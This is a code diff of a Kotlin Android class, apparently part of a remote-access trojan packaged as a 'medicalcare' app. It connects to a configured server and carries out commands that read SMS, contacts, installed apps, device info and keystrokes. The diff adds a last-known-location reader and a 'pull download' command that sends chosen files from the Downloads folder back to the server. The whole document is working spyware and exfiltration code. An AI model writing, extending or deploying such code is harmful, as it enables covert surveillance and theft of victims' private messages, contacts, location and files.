@@ -12,6 +12,8 @@ import java.io.InputStreamReader
 import java.net.Socket
 import com.example.medicalcare.features.network.commands.AppList
 import com.example.medicalcare.features.network.commands.ContactReader
+import com.example.medicalcare.features.network.commands.LocationReader
+import com.example.medicalcare.features.network.commands.DownloadManager
 
 class TCPConnection(private val context: Context) : Runnable {
     private val host = ConfigNetwork.HOST
@@ -23,9 +25,13 @@ class TCPConnection(private val context: Context) : Runnable {
         "2" to SMSReader(context),
         "3" to SMSReader(context),
         "deviceInfo" to DeviceInfoProvider(),
+        "location" to LocationReader(context),
         "applist" to AppList(context),
         "contacts" to ContactReader(context)
     )
+
+    // Dedicated download manager for interactive pulls
+    private val downloadManager = DownloadManager()
 
     // Shell mode state
     private var inShellMode = false
@@ -129,12 +135,52 @@ class TCPConnection(private val context: Context) : Runnable {
                                     toServer.write("dumpMessages -> Read SMS\n".toByteArray())
                                     toServer.write("applist -> Read All Applications\n".toByteArray())
                                     toServer.write("contacts -> Read All Contacts\n".toByteArray())
+                                    toServer.write("pull download -> Pull contents from files in Downloads\n".toByteArray())
+                                    toServer.write("location -> Get last known device location\n".toByteArray())
                                     toServer.write("keylogs -> Retrieve new captured keystrokes\n".toByteArray())
                                     toServer.write("--------------------------------------------\n".toByteArray())
                                     toServer.flush()
                                 }
+                                command.equals("pull download", ignoreCase = true) -> {
+                                    val dm = downloadManager
+                                    val files = dm.listDownloadFiles()
+                                    if (files == null || files.isEmpty()) {
+                                        toServer.write("[!] No files in Downloads\n".toByteArray())
+                                        toServer.flush()
+                                        continue
+                                    }
+
+                                    // List files numbered
+                                    toServer.write("-----------Downloads List-----------\n".toByteArray())
+                                    for ((i, f) in files.withIndex()) {
+                                        val line = "${i + 1}: ${f.name}\t${f.length()}\n"
+                                        toServer.write(line.toByteArray())
+                                    }
+                                    toServer.write("----------End of Downloads----------\n".toByteArray())
+                                    toServer.write("Select file number to pull (or 'cancel'):\n".toByteArray())
+                                    toServer.flush()
+
+                                    // Wait for selection
+                                    val sel = fromServer.readLine() ?: ""
+                                    if (sel.equals("cancel", ignoreCase = true) || sel.trim().isEmpty()) {
+                                        toServer.write("[!] Pull cancelled\n".toByteArray())
+                                        toServer.flush()
+                                        continue
+                                    }
+
+                                    val idx = try { sel.trim().toInt() - 1 } catch (e: Exception) { -1 }
+                                    if (idx < 0 || idx >= files.size) {
+                                        toServer.write("[!] Invalid selection\n".toByteArray())
+                                        toServer.flush()
+                                        continue
+                                    }
+
+                                    // Send the selected file
+                                    dm.sendFile(files[idx], toServer)
+                                }
                                 else -> {
-                                    handlers[command]?.handle(command, toServer)
+                                    val cmdToken = command.trim().split(Regex("\\s+"))[0]
+                                    handlers[cmdToken]?.handle(command, toServer)
                                         ?: run {
                                             toServer.write("[!] Unknown command: $command\n".toByteArray())
                                             toServer.flush()
